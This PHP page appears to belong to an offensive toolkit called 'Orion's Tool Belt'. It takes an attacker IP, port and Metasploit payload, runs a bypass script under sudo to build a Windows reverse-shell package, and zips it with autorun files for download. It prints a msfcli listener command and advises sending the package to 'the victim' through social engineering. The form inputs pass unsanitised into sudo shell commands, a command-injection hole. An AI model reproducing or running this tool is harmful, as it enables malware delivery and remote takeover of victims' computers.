<?php
require_once 'layout.php';
require_once 'u.php';
?>

<section id="main" class="column">
		
		<h4 class="alert_info">Orion's Tool Belt</h4>
		<div class="clear"></div>
		
              
                                         
     <?php
               
                if(isset($_POST['submit']))
                {
                    $ip=$_POST['ip'];
                    $port=$_POST['port'];
                        $pkg=$_POST['pkg'];
                        $c=$_POST['c'];
                        $s=$_POST['s'];
              
               if($ip==''||$port==''){
                   
                   echo "<script type='text/javascript'>$.msg({fadeIn : 500,fadeOut : 500,bgPath : 'dlgs/',  content : 'You Have not entered data correctly...'});</script>";
              }
               
 else {
      
                require_once 'loading.php';
                 echo "<fieldset>";
                  
                  shell("echo '[Wait] While i generate your payload....'");
                    
                           shell("sudo sh cmd/bypass.sh $c $ip $port autorun/$pkg $s");
                           exec("sudo cp autorun/$pkg exploits/$pkg && sudo chmod +x  exploits/$pkg");
                          exec("sudo zip exploits/$pkg.zip autorun/autorun.ico autorun/autorun.inf autorun/$pkg ");
                           exec("sudo rm -rf autorun/*");
                           
                          
      echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'</p>';
echo '<p><b>PAYLOAD</b>                   -->'.$c.'</p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in default format @</b>  --><a href=exploits/'.$pkg.'>Click here</a>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in zip format along with autorun files@</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';


echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Windows OS</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to the victim using any social engineering technique ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD='.$c.'  LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
$host=$_SERVER['SERVER_ADDR'];
	        echo "<p>To Open Terminal Click <a target='_blank' href='https://$host:4200/'>here</a></p>";

echo '</fieldset>';                     
               
                    echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : '".$pkg. "Generated Successfully!refer to the results tab'});</script>";
        
        
         
         echo '</div>
                                    <footer>
				<div align="left">
					
					<h3>Finished</h3>
                                        
				</div>
			</footer>
		</article><!-- end of styles article -->
                 <h4 class="alert_success">Scan Success </h4>
                 
 ';
         
 }
               
 }            
                     
    
                
 ?>
                </fieldset>
		<div class="spacer"></div>
	</section>
</body>
</html>

